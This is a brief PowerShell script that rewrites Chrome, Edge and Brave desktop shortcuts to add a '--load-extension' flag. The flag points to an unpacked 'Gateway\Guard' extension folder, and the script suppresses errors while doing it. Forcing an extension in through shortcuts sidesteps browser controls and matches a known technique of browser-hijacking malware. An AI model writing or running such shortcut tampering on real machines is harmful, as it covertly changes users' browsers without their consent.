$wsh = New-Object -ComObject WScript.Shell
$extPath = "$env:ProgramData\Gateway\Guard\guard_extension"
if (!(Test-Path $extPath)) { $extPath = "$env:LOCALAPPDATA\Gateway\Guard\guard_extension" }
$searchDirs = @(
    [Environment]::GetFolderPath("Desktop"),
    [Environment]::GetFolderPath("CommonDesktopDirectory"),
    "$env:USERPROFILE\OneDrive\Desktop"
)

foreach ($dir in $searchDirs) {
    if (Test-Path $dir) {
        Get-ChildItem -Path $dir -Filter "*.lnk" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "chrome|edge|brave" } | ForEach-Object {
            try {
                $sc = $wsh.CreateShortcut($_.FullName)
                $cur = $sc.Arguments
                if ($cur -notmatch 'load-extension') {
                    $sc.Arguments = ($cur + " --load-extension=`"$extPath`"").Trim()
                    $sc.Save()
                    Write-Host "[SUCCESS] Updated $($_.Name) with load-extension"
                } else {
                    Write-Host "[ALREADY] $($_.Name) already has load-extension"
                }
            } catch {}
        }
    }
}
